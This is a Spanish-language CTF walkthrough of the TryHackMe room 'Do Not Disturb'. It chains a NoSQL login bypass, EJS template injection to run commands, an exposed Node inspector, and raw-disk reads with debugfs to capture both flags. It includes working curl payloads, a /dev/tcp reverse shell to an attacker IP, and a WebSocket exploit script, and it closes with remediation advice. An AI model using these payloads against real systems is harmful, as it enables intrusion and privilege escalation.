---
title: "TryHackMe — Do Not Disturb (Boot2Root)"
date: 2026-08-04 12:00:00 -0400
categories: [CTF, TryHackMe]
tags: [nosql-injection, ssti, ejs, nodejs, privilege-escalation, boot2root]
---


**Categoría:** Boot2Root
**Dificultad:** Media
**Autor:** Cristhian
**Fecha:** Agosto 2026

---

## TL;DR

En esta sala explotamos una **inyección NoSQL** para saltarnos el login, escalamos a un rol de staff mediante un username filtrado en el propio HTML, abusamos de un **Server-Side Template Injection (SSTI)** en EJS para lograr ejecución remota de comandos, y finalmente descubrimos un **Node.js Inspector expuesto en localhost** que nos permitió pivotar a un segundo usuario. Ese usuario pertenecía al grupo `disk`, lo que nos permitió leer el contenido de `/root/root.txt` directamente desde el dispositivo de bloque crudo usando `debugfs`, sin necesidad de privilegios root a nivel de sistema de archivos.

**Cadena de ataque:**
```
NoSQL Injection (bypass de login)
        ↓
Username filtrado en HTML → escalada a rol "staff"
        ↓
SSTI en EJS (/staff/preview) → RCE como "poolside"
        ↓
[ USER FLAG ]
        ↓
Node Inspector expuesto en 127.0.0.1:9229 → RCE como "pipelinesvc"
        ↓
Grupo "disk" → lectura cruda del disco con debugfs
        ↓
[ ROOT FLAG ]
```

---

## 1. Reconocimiento

Empezamos con un escaneo completo de puertos:

```bash
nmap -p- -T4 -sV -sC 10.66.130.20
```

Resultado:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    Node.js (Express middleware)
```

Solo dos puertos abiertos: SSH y un servidor web en Node/Express. La página principal ("Byte Lotus — Poolside") mostraba un formulario de login que hacía `POST` a `/login`.

Enumeración de directorios con Gobuster:

```bash
gobuster dir -u http://10.66.130.20 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,js,json,txt -t 50
```

```
/staff    (Status: 403) [Size: 1547]
/logout   (Status: 302) [Size: 23] [--> /]
```

`/staff` existe pero devuelve 403 sin sesión — un panel restringido a un rol específico.

Revisando el código fuente del HTML de la página principal, el input de usuario tenía como placeholder `attendant` — una pista que resultaría clave más adelante.

---

## 2. Bypass de autenticación — NoSQL Injection

El backend corre sobre Node/Express, lo que hace sospechar de una base de datos tipo NoSQL. Probamos el login con un objeto JSON en vez de strings planos:

```bash
curl -i -X POST http://10.66.130.20/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

```
HTTP/1.1 200 OK
{"ok":true,"role":"guest"}
```

El operador `$ne` (not equal) de MongoDB se interpretó literalmente en la query, en vez de tratarse como texto. Esto autenticó como el primer usuario que matcheaba la condición — en este caso, un guest.

### Escalando a rol staff

Como `/staff` seguía devolviendo 403 con el rol `guest`, probamos apuntar directamente al username filtrado en el placeholder del formulario (`attendant`), combinado con el bypass de password:

```bash
curl -i -X POST http://10.66.130.20/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attendant","password":{"$ne":null}}' \
  -c cookies_attendant.txt
```

```
HTTP/1.1 200 OK
{"ok":true,"role":"staff"}
```

Con la cookie de sesión resultante, `/staff` ya era accesible.

**Causa raíz:** el backend pasaba `req.body.username` y `req.body.password` directamente a `db.findOneAsync({ username, password })` sin sanitizar ni forzar tipo `string`, permitiendo que operadores de MongoDB llegaran intactos a la query.

---

## 3. RCE vía Server-Side Template Injection (EJS)

El panel `/staff` exponía un formulario para personalizar plantillas de confirmación de reserva, usando **EJS** como motor de templates, y renderizando directamente lo que el usuario enviaba:

```js
app.post('/staff/preview', requireStaff, (req, res) => {
  const template = req.body.template || '';
  let rendered;
  try {
    rendered = ejs.render(template, { guest: req.session.user.username, hotel: 'Byte Lotus' });
  } catch (e) {
    rendered = 'Template error: ' + e.message;
  }
  res.send(staffDash(req.session.user.username, rendered, template));
});
```

Confirmamos la inyección con una expresión aritmética:

```bash
curl -s -X POST http://10.66.130.20/staff/preview \
  -b cookies_attendant.txt \
  -H "Content-Type: application/json" \
  -d '{"template":"<%= 7*7 %>"}'
```

El preview devolvió `49` — el input se estaba evaluando como código EJS real, no como texto plano.

Escalamos a ejecución de comandos del sistema operativo usando `process.mainModule.require`:

```bash
curl -s -X POST http://10.66.130.20/staff/preview \
  -b cookies_attendant.txt \
  -H "Content-Type: application/json" \
  -d '{"template":"<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'
```

```
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

RCE confirmado. Obtuvimos una reverse shell codificando el payload en base64 (para evitar problemas de escapado de comillas anidadas entre bash → JSON → EJS → bash):

```bash
echo -n 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64
```

```bash
curl -s -X POST http://10.66.130.20/staff/preview \
  -b cookies_attendant.txt \
  -H "Content-Type: application/json" \
  -d '{"template":"<%= process.mainModule.require(\"child_process\").execSync(\"echo <BASE64> | base64 -d | bash\") %>"}'
```

Con listener `nc -lvnp 4444` en la máquina atacante, obtuvimos shell como `poolside`.

**Causa raíz:** el input del atacante se pasaba directamente a `ejs.render()` sin usar plantillas precompiladas ni un motor de sandboxing; EJS permite JavaScript arbitrario dentro de `<% %>`.

### User flag

```bash
find / -name "user.txt" 2>/dev/null
cat /home/poolside/user.txt
```

---

## 4. Post-explotación y pivote lateral

Enumerando el sistema como `poolside`:

```bash
ps aux | grep node
```

```
pipelin+  600  ...  /usr/bin/node --inspect=127.0.0.1:9229 processor.js
poolside  601  ...  /usr/bin/node app.js
```

Un segundo proceso Node corría con el flag **`--inspect`** vinculado a `127.0.0.1:9229`, bajo el usuario `pipelinesvc`. El inspector de Node expone el **Chrome DevTools Protocol**, que permite ejecutar JavaScript arbitrario en el proceso en ejecución si se puede alcanzar el puerto.

```bash
curl -s http://127.0.0.1:9229/json
```

```json
[{
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/98e53e31-f07f-4a8a-b27d-07bbee5f3be6",
  ...
}]
```

Como el puerto estaba en localhost, y ya teníamos shell en el host, pudimos alcanzarlo directamente. Escribimos un pequeño script en Node (aprovechando que `WebSocket` es global desde Node 22) para conectarnos y ejecutar `Runtime.evaluate`:

```js
const ws = new WebSocket('ws://127.0.0.1:9229/98e53e31-f07f-4a8a-b27d-07bbee5f3be6');

ws.addEventListener('open', () => {
  ws.send(JSON.stringify({
    id: 1,
    method: 'Runtime.evaluate',
    params: {
      expression: "process.mainModule.require('child_process').execSync('id').toString()",
      returnByValue: true
    }
  }));
});

ws.addEventListener('message', (event) => console.log(event.data));
```

```bash
node /tmp/exploit.js
```

```json
{"result":{"result":{"value":"uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)\n"}}}
```

RCE confirmado como `pipelinesvc`. Repetimos el patrón de reverse shell en base64 vía el WebSocket para obtener una sesión interactiva.

**Causa raíz:** el inspector de Node quedó expuesto en un puerto de red accesible (aunque restringido a localhost, cualquier RCE previo en el host puede alcanzarlo), sin autenticación adicional más allá de conocer la URL del WebSocket — que se filtra libremente vía el endpoint HTTP `/json`.

---

## 5. Escalada a Root — Acceso crudo al disco

El detalle que hizo la diferencia: `pipelinesvc` pertenecía al grupo **`disk`**.

```bash
ls -la /dev/nvme0n1*
```

```
brw-rw---- 1 root disk 259, 1 Aug  2 21:09 /dev/nvme0n1
brw-rw---- 1 root disk 259, 2 Aug  2 21:09 /dev/nvme0n1p1
```

El grupo `disk` tiene permiso de lectura/escritura sobre los dispositivos de bloque crudos. Esto es funcionalmente equivalente a poder leer el disco entero, byte por byte, **sin pasar por los permisos del sistema de archivos**.

```bash
lsblk -f
```

```
nvme0n1p1 ext4  1.0  cloudimg-rootfs  ...  /
```

Usamos `debugfs`, una utilidad que interpreta la estructura de un filesystem ext4 directamente desde el dispositivo crudo (sin necesidad de montarlo ni de permisos POSIX normales):

```bash
debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
```

```
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

### ¿Por qué esto funciona y `cat /root/root.txt` no?

Son dos capas de permisos distintas:

- **Permisos del dispositivo de bloque** (`/dev/nvme0n1p1`): controlan quién puede leer/escribir el disco como secuencia cruda de bytes. El grupo `disk` tiene acceso aquí.
- **Permisos del sistema de archivos**: los permisos POSIX normales (`rwx`) que el kernel aplica cuando el disco está *montado* y se accede vía rutas normales como `/root/root.txt`.

`debugfs` bypasea la segunda capa completamente: en vez de pedirle al kernel que resuelva la ruta a través del filesystem montado, parsea los inodos y bloques del ext4 directamente desde el dispositivo — como reconstruir el contenido de un archivo leyendo los planos del edificio en vez de abrir la puerta del cuarto.

---

## 6. Resumen de vulnerabilidades y remediación

| # | Vulnerabilidad | Impacto | Remediación |
|---|---|---|---|
| 1 | NoSQL Injection en `/login` | Bypass de autenticación | Validar que `username`/`password` sean tipo `string` antes de la query; usar operadores explícitos, no pasar el body crudo |
| 2 | Filtración de username válido en el placeholder del HTML | Facilita ataques dirigidos | No usar credenciales o usernames reales como placeholders/ejemplos en el frontend |
| 3 | SSTI en EJS (`/staff/preview`) | RCE | Nunca renderizar templates con input controlado por el usuario; si es necesario, usar un motor con sandboxing real o precompilar templates fijos |
| 4 | Node Inspector expuesto (`--inspect`) | RCE / escalada de privilegios | No correr servicios en producción con `--inspect`; si es necesario para debug, restringir con autenticación adicional y desactivarlo fuera de entornos de desarrollo |
| 5 | Usuario de servicio en grupo `disk` | Escalada a root-equivalent (lectura arbitraria de archivos) | Principio de mínimo privilegio: los usuarios de servicio no deben pertenecer a grupos con acceso a dispositivos de bloque crudos |

---

## 7. Lecciones aprendidas

- Los inputs de tipo JSON hacia bases de datos NoSQL necesitan **validación de tipo explícita**, no solo sanitización de contenido — un objeto `{"$ne": null}` no es "texto malicioso", es un tipo de dato completamente distinto al esperado.
- Un placeholder en un formulario HTML puede filtrar información sensible (usernames reales) sin que el desarrollador lo note.
- La pertenencia a grupos secundarios del sistema (`disk`, `docker`, `lxd`, etc.) es tan crítica de auditar como `sudo -l` — a menudo se pasa por alto en checklists de hardening.
- Un debugger o inspector expuesto, incluso "solo en localhost", es una superficie de ataque real en cuanto existe cualquier otro punto de entrada al host.

---

*Sala resuelta en TryHackMe — "Do Not Disturb" (evento Boot2Root).*
